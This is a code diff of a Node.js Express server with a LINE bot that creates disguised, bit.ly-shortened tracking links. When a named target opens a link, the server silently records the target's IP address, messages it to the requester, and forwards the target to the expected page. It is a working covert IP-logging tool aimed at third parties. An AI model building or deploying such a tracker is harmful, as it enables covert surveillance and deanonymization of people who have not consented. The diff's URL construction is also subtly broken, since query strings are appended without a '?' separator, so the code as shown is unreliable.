@@ -1,15 +1,18 @@
-const https = require("https")
+const https = require("https");
+const qs = require("querystring");
+const request = require("request");
 const express = require("express");
 const port = process.env.PORT || 3000;
 const TOKEN = process.env.LINE_TOKEN;
-let name, url, IP, userId;
+const bitly_token = process.env.BITLY_TOKEN;
+let generated, userId, original;
 
-setInterval(() => {
-  name = null;
-  IP = null;
-  userId = null;
-  url = null;
-}, 600000);
+// setInterval(() => {
+//   name = null;
+//   IP = null;
+//   userId = null;
+//   url = null;
+// }, 600000);
 
 const allowCrossDomain = function(req, res, next) {
   res.header('Access-Control-Allow-Origin', '*');
@@ -25,7 +28,6 @@ const allowCrossDomain = function(req, res, next) {
   }
 };
 
-
 const app = express();
 
 app
@@ -40,7 +42,7 @@ app
     if (req.body.events[0].type === 'message') {
       const dataString = JSON.stringify({
         replyToken: req.body.events[0].replyToken,
-        messages: [{"type": "text", "text": "https://rhipsali.github.io/get_ip\nこちらのサイトで特定したい相手の名前と元のURLを入力してください。"}]
+        messages: [{"type": "text", "text": "https://rhipsali.github.io/get_ip\n上記のサイトで特定したい相手の名前と元のURLを入力してください。"}]
       });
         
     const headers = {
@@ -71,32 +73,53 @@ app
     }
   })
   .post("/", (req, res) => {
-    name = req.body.name;
-    url = req.body.url;
-    res.send(JSON.stringify({access_url: "https://bit.ly/37AiGmD"}));
+    const name = req.body.name;
+    const url = req.body.url;
+    userId = userId || null;
+    const query = {
+      name: name,
+      original: url,
+      id: userId
+    };
+    const longUrl = "https://get-ip-nero.herokuapp.com" + qs.stringify(query);
+    const req_url = "https://api-ssl.bitly.com/v3/shorten" + qs.stringify({
+      access_token: bitly_token,
+      longUrl: longUrl
+    });
+    const options = {
+      url: req_url,
+      method: 'GET',
+      json: true
+    };
+    request(options, (err, response, body) => {
+      if (err || body.status_code !== 200) {console.log(err); return};
+      generated = body.url || longUrl;
+      res.send(JSON.stringify({access_url: generated}));
+    });
   })
   .get("/", (req, res) => {
+    const nom = req.query.name, id = req.query.id;
+    original = req.query.original;
     res.sendFile(__dirname + '/open.html');
     const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.connection.socket.remoteAddress || req.socket.remoteAddress || '0.0.0.0', 
     str = (ip.match(/[^0-9.]/g)) ? ip.replace(/[^0-9.]/g, "") : ip;
-    IP = str;
-    console.log(`名前: ${name = name || 'null'}\nIPアドレス: ${str}`);
-    if(userId !== null && userId !== undefined && userId !== '') {
-      setTimeout( () => pushMsg(`名前: ${name = name || 'null'}\nIPアドレス: ${str}`), 300);
+    console.log(`名前: ${nom}\nIPアドレス: ${str}`);
+    if(id !== null && id !== undefined && id !== '') {
+      setTimeout( () => pushMsg(`${nom}さんがURLにアクセスしました\nIPアドレス: ${str}`, id), 300);
     };
   })
   .get("/auth", (req, res) => {
-    const URL = url || "https://rhipsali.github.io/get_ip";
+    const URL = original || "https://rhipsali.github.io/get_ip";
     res.send(JSON.stringify({url: URL}));
   })
   .listen(port, () => console.log("listening on " + port))
 ;
 
-function pushMsg(m) {
+function pushMsg(text, id) {
   const msg = JSON.stringify({
-    to: userId,
+    to: id,
     messages: [
-      {"type": "text", "text": m}
+      {"type": "text", "text": text}
     ]
   });
 
